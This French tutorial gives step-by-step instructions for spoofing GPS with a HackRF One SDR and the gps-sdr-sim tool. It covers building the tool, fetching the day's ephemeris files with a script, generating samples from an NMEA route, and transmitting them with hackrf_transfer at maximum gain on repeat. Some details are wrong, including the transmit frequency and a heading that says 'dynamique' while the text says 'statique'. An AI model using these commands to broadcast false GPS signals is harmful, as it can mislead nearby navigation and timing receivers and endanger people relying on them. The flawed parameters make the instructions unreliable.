# Le spoofing GPS a quoi ça consiste ?

Cela consiste à générer de fausses données GPS dans le but de changer la localisation et l’horodatage de matériels équipé d’un système GPS.

# Matériels nécessaires

Vous aurez besoin d’un SDR, ici le HackRF One, d’un système ubuntu, d’une antenne qui peut émettre des fréquences GPS et d’un système GPS ou un smartphone.

Attention, si vous utilisez votre Smartphone quelques manipulations sont requises !

-   Désactiver les service de précision google.
    
-   Mettre en GPS Only
    
-   Télécharger GPS TEST sur le playstore
    
-   Mettre en mode avion puis effacé votre [A-GPS](https://fr.wikipedia.org/wiki/Assisted_GPS) cache dans GPS test.
    

Soyez patient, les résultats peuvent mettrent un certain temps à arriver. Cependant, avec un système GPS classique, les résultats sont bien plus rapides (⅔ minutes).

# Le projet GPS-SDR-SIM

Le projet GPS-SDR-SIM est un projet open source qui génère des signaux GPS. Pour cela, il faut avoir à disposition une éphéméride GPS. La durée maximale par défaut des échantillons générés est de trois minutes. Mais il est possible de répéter l'opération en boucle.

Voici la mise en place sur un système Ubuntu :

    $ git clone git@github.com:osqzss/gps-sdr-sim.git
    
    $ cd gps-sdr-sim
    
    $ gcc gpssim.c -lm -fopenmp -o gps-sdr-sim

  

# Mise en place de l’attaque dynamique

Nous allons mettre en place une attaque statique, pour ce faire nous utiliserons les BRDC (Broadcast Ephemeris Data) qui contiennent les messages éphémérides uniques des satellites GPS du jour. Les données d'éphémérides fournissent les données de localisation exactes (x(t), y(t), z(t)) de chaque satellite, afin que les récepteurs puissent calculer leur position.

Ses archives sont disponibles sur le serveur de fichier : “[ftp://cddis.gsfc.nasa.gov/gnss/data/daily/](ftp://cddis.gsfc.nasa.gov/gnss/data/daily/)”.

les fichier sont nommés comme-suit: brdcDDD0.YYn

-   DDD : représente le numéro du jour de l’année, il est compris entre 1 et 365
    
-   YY : corresponds aux deux derniers chiffres de l’année
    

Donc le fichier “brdc3500.19n” correspond à la trajectoire des satellites du 350 ème jour de l’année 2019.

Lors de l’attaque il indispensable d’avoir le fichier du jour !

Voici un petit script utile, cependant, ce script se base sur l’horodatage de votre ordinateur, veuillez vérifier que celui-ci soit à jour !

    #!/bin/sh
    
    day=$(date +%j)
    
    year=$(date +%Y)
    
    yr=$(date +%y)
    
    wget "ftp://cddis.gsfc.nasa.gov/gnss/data/daily/$year""/brdc/brdc""$day""0.$yr""n.Z"
    
    uncompress "brdc""$day""0.$yr""n.Z"
    
    echo "brdc""$day""0.$yr""n.Z"

Pour générer des échantillons de signaux GPS dynamiquement avec un trajet prédéfini, il suffit d'utiliser un fichier NMEA, c’est un fichier texte qui contient des informations de format NMEA.

Je vous invite à lire l’annexe Les fichiers NMEA et Tutoriel - Génération fichier NMEA.

    $./gps-sdr-sim -b 8 -e brdcDDD0.YYn -g triumphv3.txt
   **Options:**

-   -b Format de données I/Q, le HackRF utilise le format 8.
    
-   -e Fichier de navigation BRDC pour les éphémérides GPS (obligatoire).
    
-   -g Fichier au format NMEA
    

# Génération du Spoofing

Une fois que les échantillons de signaux sont générés, un fichier gpssim.bin apparaît, il sera utile pour transmettre à l'antenne de la plate-forme SDR les échantillons de signaux qui ont été générés.

Transmission à l’antenne du HackRF ONE :

    $hackrf_transfer -t gpssim.bin -f 157542000000 -s 2600000 -a 1 -x 47 -p 1 -R

**Options:**

- -t nom de fichier.
    
-   -f Fréquence en Hz (ici GPS donc 157542000000)
    
-   -s Fréquence d'échantillonnage, fréquence d'échantillonnage en Hz (ne pas changer)
    
-   -a Amplificateur RF RX/TX 1=Enable, 0=Désactivé.
    
-   -x Gain db, gain TX VGA (IF), 0-47dB.
    
-   -p Alimentation du port de l'antenne, 1=Activée, 0=Désactivée.
    
-   -R, Répète l’envoie TX.
    

Si vous utilisez l’application GPS test, des barres vertes plus hautes que la normale devraient apparaitres. Cependant, cela signifie seulement que le téléphone reçoit des fréquences GPS.
